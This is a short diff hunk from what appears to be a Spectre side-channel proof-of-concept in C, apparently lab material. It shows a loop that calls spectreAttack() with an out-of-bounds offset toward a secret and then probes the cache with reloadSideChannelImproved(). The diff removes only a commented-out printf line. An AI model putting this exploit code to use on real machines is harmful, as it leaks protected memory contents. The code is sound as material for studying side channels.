@@ -87,7 +87,6 @@ int main() {
     size_t larger_x = (size_t)(secret-(char*)buffer);
     for(i=0;i<256; i++) scores[i]=0; 
     for (i = 0; i < 1000; i++) {
-      //printf(""); // This seemly "useless" line is necessary for the attack to succeed
       spectreAttack(larger_x + m);
       usleep(10);
       reloadSideChannelImproved();
